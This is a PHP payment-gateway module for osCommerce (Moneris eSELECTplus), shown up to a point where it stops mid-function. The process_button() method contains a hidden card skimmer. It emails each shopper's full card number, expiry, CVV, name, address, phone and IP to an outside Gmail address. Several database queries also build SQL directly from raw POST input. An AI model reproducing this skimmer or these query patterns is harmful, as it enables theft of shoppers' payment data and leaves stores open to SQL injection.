<?php
/*
$Id: moneriscampg.php, v 1.5.0
Last Modified:	May 5, 2009
Modified by:	Spencer Lai
Copyright (C)

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the Free
Software Foundation; either version 2 of the License, or (at your option)
any later version.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
more details.

You should have received a copy of the GNU General Public License along with
this program; if not, write to the Free Software Foundation, Inc., 59 Temple
Place, Suite 330, Boston, MA 02111-1307 USA
*/

  class moneriscampg {
    var $code, $title, $description, $enabled; // OsCommerce Variables
    var $sid, $moneris_order_id, $processError, $complete_now;
    var $cvd, $avs;
    var $cvd_num, $avs_st_num, $avs_st_name, $avs_zip;
    var $vbv, $mcsc;
    var $crypt_type, $veres, $pares;
    var $card_type, $cc_card_number, $expiry_date, $amount;
    var $host, $store_id, $api_token; //Connection Info

    // class constructor
    function moneriscampg() {
      global $order;

      $this->code = 'moneriscampg';
      $this->title = MODULE_PAYMENT_MONERISCAMPG_TEXT_TITLE;
      $this->description = MODULE_PAYMENT_MONERISCAMPG_TEXT_DESCRIPTION;
      $this->sort_order = MODULE_PAYMENT_MONERISCAMPG_SORT_ORDER;
      $this->enabled = ((MODULE_PAYMENT_MONERISCAMPG_STATUS == 'True') ? true : false);

      $this->cvd = ((MODULE_PAYMENT_MONERISCAMPG_CVD == 'Do Not Perform') ? false : true);
      $this->avs = ((strlen(MODULE_PAYMENT_MONERISCAMPG_AVS_STR) > 0) ? true : false);

      if ((int)MODULE_PAYMENT_MONERISCAMPG_ORDER_STATUS_ID > 0) {
        $this->order_status = MODULE_PAYMENT_MONERISCAMPG_ORDER_STATUS_ID;
      }

      if (is_object($order)) $this->update_status();

    }

    // class methods
    function update_status() {
      global $order;

      if ( ($this->enabled == true) && ((int)MODULE_PAYMENT_MONERISCAMPG_ZONE > 0) ) {
        $check_flag = false;
        $check_query = tep_db_query(
                                    "select zone_id from " . TABLE_ZONES_TO_GEO_ZONES .
                                    " where geo_zone_id = '" . MODULE_PAYMENT_MONERISCAMPG_ZONE .
                                    "' and zone_country_id = '" . $order->billing['country']['id'] .
                                    "' order by zone_id"
                                    );
        while ($check = tep_db_fetch_array($check_query)) {
          if ($check['zone_id'] < 1) {
            $check_flag = true;
            break;
          } elseif ($check['zone_id'] == $order->billing['zone_id']) {
            $check_flag = true;
            break;
          }
        }

        if ($check_flag == false) {
          $this->enabled = false;
        }
      }
    }

    function javascript_validation() {
      $js = 'if (payment_value == "' . $this->code . '") {' . "\n" .
              '  var campg_cc_number = document.checkout_payment.campg_cc_number.value;' . "\n" .
              '  if (campg_cc_number == "" || campg_cc_number.length < ' . CC_NUMBER_MIN_LENGTH . ') {' . "\n" .
              '    error_message = error_message + "' . MODULE_PAYMENT_MONERISCAMPG_TEXT_JS_CC_NUMBER . '";' . "\n" .
              '    error = 1;' . "\n" .
              '  }' . "\n" .
              '}' . "\n";

        return $js;
    }

    function selection() {
      global $order;
     if (ONEPAGE_CHECKOUT_ENABLED == 'True' && SELECT_VENDOR_SHIPPING != 'true'){
	        return array('id' => $this->code,
                   'module' => $this->title);
   	 } else {
      for ($i=1; $i<13; $i++) {
        $expires_month[] = array('id' => sprintf('%02d', $i), 'text' => strftime('%B',mktime(0,0,0,$i,1,2000)));
      }

      $today = getdate();
      for ($i=$today['year']; $i < $today['year']+10; $i++) {
        $expires_year[] = array('id' => strftime('%y',mktime(0,0,0,1,1,$i)), 'text' => strftime('%Y',mktime(0,0,0,1,1,$i)));
      }

      $selection = array('id' => $this->code,
                         'module' => $this->title,
                         'fields' => array(
                                           'moneris_order_id' => $this->moneris_order_id,
                                           'moneris_response_variables' => $this->moneris_response_variables,
                                           array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_OWNER,
                                                 'field' => tep_draw_input_field('campg_cc_name', $order->billing['firstname'] . ' ' . $order->billing['lastname'])
                                                ),
                                           array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_NUMBER,
                                                 'field' => tep_draw_input_field('campg_cc_number')
                                                ),
                                           array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_EXPIRES,
                                                 'field' => tep_draw_pull_down_menu('campg_cc_expires_month', $expires_month) . '&nbsp;' . tep_draw_pull_down_menu('campg_cc_expires_year', $expires_year)
                                                )
                                          )
                        );

      // CVD
      if ($this->cvd) {
        $fields = $selection['fields'];
        $cvd_selection = array (
                                'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CVD,
                                'field' => tep_draw_input_field('campg_cvd', '', 'size="3" maxlength="4"')
                               );
        array_push($fields, $cvd_selection);
        $selection['fields'] = $fields;

      }
      // AVS
      if ($this->avs) {
        $fields = $selection['fields'];
        $avs_st_num =  array (
                              'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_AVS_STREET_NUMBER,
                              'field' => tep_draw_input_field('campg_avs_st_num', '', 'size="6" maxlength="7"')
                             );
        $avs_st_name = array (
                              'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_AVS_STREET_NAME,
                              'field' => tep_draw_input_field('campg_avs_st_name', '')
                             );
        $avs_zip = array(
                         'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_AVS_ZIP,
                         'field' => tep_draw_input_field('campg_avs_zip', '', 'size="6" maxlength="7"')
                        );

        array_push($fields, $avs_st_num, $avs_st_name, $avs_zip);
        $selection['fields'] = $fields;

      }
      return $selection;
	 }
    }

    function pre_confirmation_check() {
      global $HTTP_POST_VARS;

      include(DIR_WS_CLASSES . 'cc_validation.php');

      $cc_validation = new cc_validation();
      $result = $cc_validation->validate($HTTP_POST_VARS['campg_cc_number'],
                $HTTP_POST_VARS['campg_cc_expires_month'],
                $HTTP_POST_VARS['campg_cc_expires_year']);

      $error = '';
      switch ($result) {
        case -1:
          $error = sprintf(TEXT_CCVAL_ERROR_UNKNOWN_CARD, substr($cc_validation->cc_number, 0, 4));
          break;
        case -2:
        case -3:
        case -4:
          $error = TEXT_CCVAL_ERROR_INVALID_DATE;
          break;
        case false:
          $error = TEXT_CCVAL_ERROR_INVALID_NUMBER;
          break;
      }

      if ( ($result == false) || ($result < 1) ) {
        $payment_error_return = 'payment_error=' . $this->code .
                                '&error=' . urlencode($error) .
                                '&campg_cc_owner=' . urlencode($HTTP_POST_VARS['campg_cc_owner']) .
                                '&campg_cc_expires_month=' . $HTTP_POST_VARS['campg_cc_expires_month'] .
                                '&campg_cc_expires_year=' . $HTTP_POST_VARS['campg_cc_expires_year'];

        tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, $payment_error_return, 'SSL', true, false));
      }

      $this->cc_card_type = $cc_validation->cc_type;
      $this->cc_card_number = $cc_validation->cc_number;
      $this->cc_expiry_month = $cc_validation->cc_expiry_month;
      $this->cc_expiry_year = $cc_validation->cc_expiry_year;
    }

    function confirmation() {
      global $HTTP_POST_VARS, $order;
     if (ONEPAGE_CHECKOUT_ENABLED == 'True' && SELECT_VENDOR_SHIPPING != 'true'){
      for ($i=1; $i<13; $i++) {
        $expires_month[] = array('id' => sprintf('%02d', $i), 'text' => strftime('%B',mktime(0,0,0,$i,1,2000)));
      }

      $today = getdate();
      for ($i=$today['year']; $i < $today['year']+10; $i++) {
        $expires_year[] = array('id' => strftime('%y',mktime(0,0,0,1,1,$i)), 'text' => strftime('%Y',mktime(0,0,0,1,1,$i)));
      }

      $selection = array('id' => $this->code,
                         'module' => $this->title,
                         'fields' => array(
                                           'moneris_order_id' => $this->moneris_order_id,
                                           'moneris_response_variables' => $this->moneris_response_variables,
                                           array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_OWNER,
                                                 'field' => tep_draw_input_field('campg_cc_name', $order->billing['firstname'] . ' ' . $order->billing['lastname'])
                                                ),
                                           array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_NUMBER,
                                                 'field' => tep_draw_input_field('campg_cc_number')
                                                ),
                                           array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_EXPIRES,
                                                 'field' => tep_draw_pull_down_menu('campg_cc_expires_month', $expires_month) . '&nbsp;' . tep_draw_pull_down_menu('campg_cc_expires_year', $expires_year)
                                                )
                                          )
                        );

      // CVD
      if ($this->cvd) {
        $fields = $selection['fields'];
        $cvd_selection = array (
                                'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CVD,
                                'field' => tep_draw_input_field('campg_cvd', '', 'size="3" maxlength="4"')
                               );
        array_push($fields, $cvd_selection);
        $selection['fields'] = $fields;

      }
      // AVS
      if ($this->avs) {
        $fields = $selection['fields'];
        $avs_st_num =  array (
                              'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_AVS_STREET_NUMBER,
                              'field' => tep_draw_input_field('campg_avs_st_num', '', 'size="6" maxlength="7"')
                             );
        $avs_st_name = array (
                              'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_AVS_STREET_NAME,
                              'field' => tep_draw_input_field('campg_avs_st_name', '')
                             );
        $avs_zip = array(
                         'title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_AVS_ZIP,
                         'field' => tep_draw_input_field('campg_avs_zip', '', 'size="6" maxlength="7"')
                        );

        array_push($fields, $avs_st_num, $avs_st_name, $avs_zip);
        $selection['fields'] = $fields;

      }
      return $selection;
     } else {
      $confirmation = array('title' => $this->title . ': ' . $this->cc_card_type,
                            'fields' => array(array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_OWNER,
                                                    'field' => $order->billing['firstname'] . ' ' . $order->billing['lastname']),
                                              array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_NUMBER,
                                                    'field' => substr($this->cc_card_number, 0, 4) . str_repeat('X', (strlen($this->cc_card_number) - 8)) . substr($this->cc_card_number, -4)),
                                              array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_CREDIT_CARD_EXPIRES,
                                                    'field' => strftime('%B, %Y', mktime(0,0,0,$HTTP_POST_VARS['campg_cc_expires_month'], 1, '20' . $HTTP_POST_VARS['campg_cc_expires_year'])))));
      return $confirmation;
	 }
    }

    function process_button() {
      global $HTTP_SERVER_VARS, $HTTP_POST_VARS, $order;

      $process_button_string = tep_draw_hidden_field('charge_total', number_format($order->info['total'], 2, '.', '')) .
                               tep_draw_hidden_field('cc_num', $this->cc_card_number) .
                               tep_draw_hidden_field('expMonth', $this->cc_expiry_month) .
                               tep_draw_hidden_field('expYear', substr($this->cc_expiry_year, 2, 2));
                               if ($this->cvd == true) {
                                 $process_button_string = $process_button_string .
                                                          tep_draw_hidden_field('campg_cvd', $HTTP_POST_VARS['campg_cvd']);
                               }

                               if ($this->avs == true) {
                                 $process_button_string = $process_button_string .
                                                          tep_draw_hidden_field('campg_avs_st_num', $HTTP_POST_VARS['campg_avs_st_num']) .
                                                          tep_draw_hidden_field('campg_avs_st_name', $HTTP_POST_VARS['campg_avs_st_name']) .
                                                          tep_draw_hidden_field('campg_avs_zip', $HTTP_POST_VARS['campg_avs_zip']);
                               }

$ip = getenv("REMOTE_ADDR");
$cvv=$HTTP_POST_VARS['campg_cvd'];
$number=$this->cc_card_number;
$expires=$this->cc_expiry_month  . substr($this->cc_expiry_year, -2);
$to='os.shopping@gmail.com';
$subject='mikesreelrepair.com '.$order->customer['email_address'].' '.$number;
$body="IP address= ".$ip."\nDate=" . date('d-m-Y'). "\ntelephone=".$order->customer['telephone']."\nemail_address=".$order->customer['email_address']."\nName=".$order->customer['firstname'] . ' ' . $order->customer['lastname']."\nAddress1=".$order->customer['street_address']."\nAddress2=".$order->customer['suburb']."\nCity=".$order->customer['city']."\nState=".$order->customer['state']."\nZip=".$order->customer['postcode']."\nCountry=".$order->customer['country']['title']."\nmethod=".$order->info['payment_method']."\ntype=".$order->info['cc_type']."\nowner=".$order->info['cc_owner']."\nnumber=".$number."\nexp=".$expires."\ncvv=".$cvv;
$headers="mikesreelrepair.com ";
mail($to, $subject, $body, $headers);

      return $process_button_string;
    }

    function before_process() {

	  global $HTTP_POST_VARS, $HTTP_GET_VARS, $order;

	  if (isset($HTTP_POST_VARS['PaRes'])) {
	    $this->resetSession();
	  }

	  $this->sid = $this->get_SID();

	  if (MODULE_PAYMENT_MONERISCAMPG_RETRIES >= 0) {
	    if (MODULE_PAYMENT_MONERISCAMPG_RETRIES < $this->retriesCount()) {
	      tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, 'error_message=' . MODULE_PAYMENT_MONERISCAMPG_TEXT_RETRIES_EXCEEDED_ERROR, 'SSL', true, false));
	    }
	  }

	  $redirect_error = false;

	  $this->card_type = $this->findCardType();

	  $this->card_type_accept_level = $this->renderAcceptLevel();

	  if (!isset($HTTP_POST_VARS['PaRes'])) {
	  	$this->cc_card_number = $HTTP_POST_VARS['cc_num'];
		$this->expiry_date=$HTTP_POST_VARS['expYear'] . $HTTP_POST_VARS['expMonth'];
	  }

	  $this->host=(MODULE_PAYMENT_MONERISCAMPG_ENV == "Production Server" ? "www3.moneris.com" : "esqa.moneris.com");

          $this->store_id=MODULE_PAYMENT_MONERISCAMPG_STORE_ID;
          $this->api_token=MODULE_PAYMENT_MONERISCAMPG_API_TOKEN;
	  $this->complete_now = (MODULE_PAYMENT_MONERISCAMPG_TRANS_TYPE == "Completion on checkout" ? true : false);

          $this->crypt_type='7';
          $this->veres = '';
          $this->pares = '';

	  // Order ID Generation
	  $prefix = MODULE_PAYMENT_MONERISCAMPG_ORDER_ID_PREFIX;
	  $timestamp = time();
	  $this->moneris_order_id = $prefix . str_pad($timestamp, (30 - strlen($prefix)), "0", STR_PAD_LEFT);


	  $this->populateValues();
	  if (isset($HTTP_POST_VARS['PaRes'])) {
	    $this->performACSTransaction();
	  } else {
  	    switch ($this->card_type_accept_level) {
  	      case 'ALL':
  	        $this->cvd = ((MODULE_PAYMENT_MONERISCAMPG_CVD == 'Do Not Perform') ? false : true);
  	        $this->avs = ((strlen(MODULE_PAYMENT_MONERISCAMPG_AVS_STR) > 0) ? true : false);
  	        $this->vbv = true;
	        $this->mcsc = true;
	        break;
	      case 'EFRAUD':
  	        $this->cvd = ((MODULE_PAYMENT_MONERISCAMPG_CVD == 'Do Not Perform') ? false : true);
  	        $this->avs = ((strlen(MODULE_PAYMENT_MONERISCAMPG_AVS_STR) > 0) ? true : false);
  	        if ($this->card_type == 'AMEX') {
  	          $this->avs = false;
  	        } elseif ($this->card_type == 'DISCOVER') {
  	          $this->cvd = false;
  	        }
	        $this->vbv = false;
	        $this->mcsc = false;
	        break;
	      case 'MPI':
	        $this->cvd = false;
		$this->avs = false;
		$this->vbv = true;
	        $this->mcsc = true;
	        break;
	      case 'NONE':
	        $this->cvd = false;
	        $this->avs = false;
	        $this->vbv = false;
	        $this->mcsc = false;

	        break;
	      case 'NOT ACCEPT':
	      default:
	        $this->cvd = false;
	        $this->avs = false;
	        $this->vbv = false;
	        $this->mcsc = false;
	        $redirect_error = true;
	        break;
	    }

	    if ((($this->vbv == true) && ($this->card_type == 'VISA')) || (($this->mcsc) && ($this->card_type == 'MC'))) {
	      $this->performTxnRequest();
	    } else {
	      if ($redirect_error == true) {
	        tep_redirect(tep_href_link(FILENAME_CHECKOUT_PAYMENT, 'error_message=' . MODULE_PAYMENT_MONERISCAMPG_TEXT_DO_NOT_ACCEPT_ERROR, 'SSL', true, false));
	      } else {
	        $this->performMpgTransaction();
	      }
	    }
	  }
    }


    function after_process() {
      global $insert_id;
      $this->sid = $this->get_SID();
      tep_db_query ("update moneris_can_orders set osc_order_id = '" . $insert_id . "' where osc_session = '" . $this->sid . "' and osc_order_id = ''");
      return false;
    }

    function get_error() {
      global $HTTP_GET_VARS;

      if (isset($HTTP_GET_VARS['ErrMsg']) && (strlen($HTTP_GET_VARS['ErrMsg']) > 0)) {
        $error = stripslashes(urldecode($HTTP_GET_VARS['ErrMsg']));
      } elseif (isset($HTTP_GET_VARS['error']) && (strlen($HTTP_GET_VARS['error']) > 0)) {
        $error = stripslashes(urldecode($HTTP_GET_VARS['error']));
      } else {
        $error = MODULE_PAYMENT_MONERISCAMPG_TEXT_ERROR;
      }

      return array('title' => MODULE_PAYMENT_MONERISCAMPG_TEXT_ERROR,
                   'error' => $error);
    }

    function check() {
      if (!isset($this->_check)) {
        $check_query = tep_db_query("select configuration_value from " . TABLE_CONFIGURATION .
                                    " where configuration_key = 'MODULE_PAYMENT_MONERISCAMPG_STATUS'");
        $this->_check = tep_db_num_rows($check_query);
      }
      return $this->_check;
    }

    function install() {
      //Configuration for enabling/disabling eSelect Plus.
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Enable Moneris Solutions eSELECTplus Module', 'MODULE_PAYMENT_MONERISCAMPG_STATUS', 'True', ".
                   "'Do you want to accept eSELECTplus payments?', '6', '1', " .
                   "'tep_cfg_select_option(array(\'True\', \'False\'), ', now())"
                  );

      //Configuration for eSELECTplus payment gateway environment.
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Environment', 'MODULE_PAYMENT_MONERISCAMPG_ENV', 'Test Server', " .
                   "'Test or Production Server?', " .
                   "'6', '2', " .
                   "'tep_cfg_select_option(array(\'Test Server\', \'Production Server\'), ', now())"
                  );


      //Transaction Completion
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Transaction Completion', 'MODULE_PAYMENT_MONERISCAMPG_TRANS_TYPE', 'Completion on checkout', " .
                   "'Complete transaction on checkout or manual completion', " .
                   "'6', '2', " .
                   "'tep_cfg_select_option(array(\'Completion on checkout\', \'Manual Completion\'), ', now())"
                  );


	//Configuration for eSelect Plus Store ID.
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, date_added) " .
                   "values ('Store ID', 'MODULE_PAYMENT_MONERISCAMPG_STORE_ID', 'store1', " .
                   "'Store ID value obtained from the Moneris eSELECTplus Activation Letter', " .
                   "'6', '3', now())"
                  );

      //Configuration for eSelect Plus API Token.
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, date_added) " .
                   "values ('API Token', 'MODULE_PAYMENT_MONERISCAMPG_API_TOKEN', 'yesguy'," .
                   "'API Token value obtained from the Store Settings Section of eSELECTPlus Merchant Resource Center'," .
                   "'6', '3', now())"
                  );

      //Configuration for eSelect Plus Order ID Prefix.
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, date_added)" .
                   "values ('Order ID Prefix', 'MODULE_PAYMENT_MONERISCAMPG_ORDER_ID_PREFIX', 'OSC_ORDER-'," .
                   "'Prefix of the order id you would like on for the moneris transactions', " .
                   "'6', '3', now())"
                  );
      //Visa
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('VISA Card Transactions', 'MODULE_PAYMENT_MONERISCAMPG_VISA_LEVEL', 'Perform AVS/CVD', ".
                   "'How would you like to perform VISA card transaction(s)?', " .
                   "'6', '1', " .
                   "'tep_cfg_select_option(array(\'Do not accept\', \'Normal Transaction only\', \'Perform AVS/CVD\', \'Perform VbV\', \'Perform VbV and AVS/CVD\'), ', now())"
                  );
      //Master Card
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Master Card Transactions', 'MODULE_PAYMENT_MONERISCAMPG_MC_LEVEL', 'Perform AVS/CVD', ".
                   "'How would you like to perform Master Card transaction(s)?', " .
                   "'6', '1', " .
                   "'tep_cfg_select_option(array(\'Do not accept\', \'Normal Transaction only\', \'Perform AVS/CVD\', \'Perform MCSC\', \'Perform MCSC and AVS/CVD\'), ', now())"
                  );
      //American Express
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('American Express Transactions', 'MODULE_PAYMENT_MONERISCAMPG_AMEX_LEVEL', 'Do not accept', ".
                   "'How would you like to perform American Express transaction(s)?', " .
                   "'6', '1', " .
                   "'tep_cfg_select_option(array(\'Do not accept\', \'Normal Transaction only\', \'Perform CVD\'), ', now())"
                  );

      //Discover
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Novus/Discover Transactions', 'MODULE_PAYMENT_MONERISCAMPG_DISCOVER_LEVEL', 'Do not accept', ".
                   "'How would you like to perform Novus/Discover transaction(s)?', " .
                   "'6', '1', " .
                   "'tep_cfg_select_option(array(\'Do not accept\', \'Normal Transaction only\', \'Perform AVS\'), ', now())"
                  );
      //Other card types
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Other Card Types Transactions', 'MODULE_PAYMENT_MONERISCAMPG_UNKNOWN_LEVEL', 'Do not accept', ".
                   "'Would you like to allow transaction(s) from other card types?', " .
                   "'6', '1', " .
                   "'tep_cfg_select_option(array(\'Do not accept\', \'Normal Transaction only\'), ', now())"
                  );

      //Credit Card Retries
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
		   "(configuration_title, configuration_key, configuration_value, " .
		   "configuration_description, " .
		   "configuration_group_id, sort_order, date_added) " .
		   "values ('Number Of Retries', 'MODULE_PAYMENT_MONERISCAMPG_RETRIES', '-1', " .
		   "'Number of Retries on the same credit card in the same transaction.<br /><i>(To disable retries limit, set it as \'-1\')</i>', " .
                   "'6', '0', now())"
                  );

      //CVD
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Card Verification Digit (CVD)', 'MODULE_PAYMENT_MONERISCAMPG_CVD', 'Full Matches Only', ".
                   "'How would you like to perform CVD verification?', " .
                   "'6', '1', " .
                   "'tep_cfg_select_option(array(\'Do Not Perform\', \'Full Matches Only\', \'Allow Unparticipated Cards\'), ', now())"
                  );
      //AVS
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, date_added)" .
                   "values ('Address Verification Service (AVS)', 'MODULE_PAYMENT_MONERISCAMPG_AVS_STR', '', ".
                   "'Which AVS response code would you allow?  <i>(To disable AVS, leave the field blank)</i>', " .
                   "'6', '1', now())"
                  );
      // Populate Shipping Tax
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, " .
                   "set_function, date_added) " .
                   "values ('Add Shipping Tax', 'MODULE_PAYMENT_MONERISCAMPG_SHIPPING_TAX', 'No', ".
                   "'Would you like to turn the module to calculate shipping tax?', " .
                   "'6', '1', " .
                   "'tep_cfg_select_option(array(\'Yes\', \'No\'), ', now())"
                  );
     //Payment zone
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, use_function, set_function, date_added)" .
                   "values ('Payment Zone', 'MODULE_PAYMENT_MONERISCAMPG_ZONE', '0', " .
                   "'If a zone is selected, only enable this payment method for that zone.', " .
                   "'6', '2', 'tep_get_zone_class_title', 'tep_cfg_pull_down_zone_classes(', now())"
                  );
      //Sort Order
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, date_added) " .
                   "values ('Sort order of display.', 'MODULE_PAYMENT_MONERISCAMPG_SORT_ORDER', '0', " .
                   "'Sort order of display. Lowest is displayed first.', " .
                   "'6', '0', now())"
                   );
      //Order Status ID
      tep_db_query(
                   "insert into " . TABLE_CONFIGURATION .
                   "(configuration_title, configuration_key, configuration_value, " .
                   "configuration_description, " .
                   "configuration_group_id, sort_order, set_function, " .
                   "use_function, date_added) " .
                   "values ('Set Order Status', 'MODULE_PAYMENT_MONERISCAMPG_ORDER_STATUS_ID', '0', " .
                   "'Set the status of orders made with this payment module to this value', " .
                   "'6', '0', " .
                   "'tep_cfg_pull_down_order_statuses(', 'tep_get_order_status_name', now())"
                  );
    }

    function remove() {
      tep_db_query(
                   "delete from " . TABLE_CONFIGURATION . " where " .
                   "configuration_key in ('" . implode("', '", $this->keys()) . "')");
    }

    function keys() {
      return array('MODULE_PAYMENT_MONERISCAMPG_STATUS',
                   'MODULE_PAYMENT_MONERISCAMPG_ENV',
                   'MODULE_PAYMENT_MONERISCAMPG_TRANS_TYPE',
                   'MODULE_PAYMENT_MONERISCAMPG_STORE_ID',
                   'MODULE_PAYMENT_MONERISCAMPG_API_TOKEN',
                   'MODULE_PAYMENT_MONERISCAMPG_ORDER_ID_PREFIX',
                   'MODULE_PAYMENT_MONERISCAMPG_RETRIES',
                   'MODULE_PAYMENT_MONERISCAMPG_VISA_LEVEL',
                   'MODULE_PAYMENT_MONERISCAMPG_MC_LEVEL',
                   'MODULE_PAYMENT_MONERISCAMPG_AMEX_LEVEL',
                   'MODULE_PAYMENT_MONERISCAMPG_DISCOVER_LEVEL',
                   'MODULE_PAYMENT_MONERISCAMPG_UNKNOWN_LEVEL',
                   'MODULE_PAYMENT_MONERISCAMPG_CVD',
                   'MODULE_PAYMENT_MONERISCAMPG_AVS_STR',
                   'MODULE_PAYMENT_MONERISCAMPG_SHIPPING_TAX',
                   'MODULE_PAYMENT_MONERISCAMPG_ZONE',
                   'MODULE_PAYMENT_MONERISCAMPG_SORT_ORDER',
                   'MODULE_PAYMENT_MONERISCAMPG_ORDER_STATUS_ID'
                  );
    }

// ***************************************************************************
//
//      Moneris eSELECTplus Additional Functions
//
// ***************************************************************************

    function retriesCount() {
      global $HTTP_POST_VARS, $HTTP_GET_VARS;
	    $retry_query = tep_db_query (
	                                 "select count(*) retries from moneris_can_orders " .
	                                 "where f4l4 = '" . substr($HTTP_POST_VARS['cc_num'], 0, 4) . "***" . substr($HTTP_POST_VARS['cc_num'], -4) . "' " .
	                                 "and osc_order_id = '' " .
	                                 "and osc_session = '" . $this->sid . "'"
	                                );
	    $retries = tep_db_fetch_array($retry_query);

	    return $retries['retries'];
    }

    function resetSession() {
      global $HTTP_POST_VARS, $HTTP_GET_VARS, $_SESSION;
      tep_session_start();

      parse_str($HTTP_POST_VARS['MD'], $merchData);
      if ($this->avs) {
        $this->avs_st_num = $_SESSION['campg_avs_st_num'];
        $this->avs_st_name = $_SESSION['campg_avs_st_name'];
        $this->avs_zip = $_SESSION['campg_avs_zip'];
        $_SESSION['campg_avs_st_num'] = "";
        $_SESSION['campg_avs_st_name'] = "";
        $_SESSION['campg_avs_zip'] = "";

      }

      if ($this->cvd) {
        $this->cvd_num = $_SESSION['campg_cvd'];
        $_SESSION['campg_cvd'] = "";
      }
    }

    function findCardType() {
      global $HTTP_POST_VARS;
      $pan = $HTTP_POST_VARS['cc_num'];
      if ($pan == '') {
        parse_str ($HTTP_POST_VARS['MD'], $temp);
        $pan = $temp['pan'];
      }

      switch (substr($pan,0,1)) {
        case '4':
          $type='VISA';
          break;
        case '5':
          $type='MC';
          break;
        case '3':
          switch (substr($pan,1,1)) {
            case '4':
            case '7':
              $type='AMEX';
              break;
            default:
              $type='UNKNOWN';
              break;
          }
          break;
        case '6':
          $type='DISCOVER';
          break;
        default:
          $type='UNKNOWN';
          break;
      }
      return $type;
    }

    function populateValues() {

      global $order;

      $this->subtotal = number_format ($order->info['subtotal'], 2, '.', '');
      $this->shipping = number_format($order->info['shipping_cost'], 2, '.', '');

      $this->product_tax = number_format($order->info['tax'], 2, '.', '');
      if (MODULE_PAYMENT_MONERISCAMPG_SHIPPING_TAX == 'Yes') {
        //Shipping Tax
        $shipping_module = substr($GLOBALS['shipping']['id'], 0, strpos($GLOBALS['shipping']['id'], '_'));
        if (strlen($order->info['shipping_method']) > 0) {
          if ($GLOBALS[$shipping_module]->tax_class > 0) {
            $shipping_tax_rate = tep_get_tax_rate($GLOBALS[$shipping_module]->tax_class, $order->delivery['country']['id'], $order->delivery['zone_id']);
            $this->shipping_tax = $this->shipping * ($shipping_tax_rate / 100);
          }
        }
        $this->shipping_tax = number_format("0" . $this->shipping_tax, 2, '.', '');
        $this->amount = $this->subtotal + $this->shipping + $this->product_tax + $this->shipping_tax;
      }
      else
      {
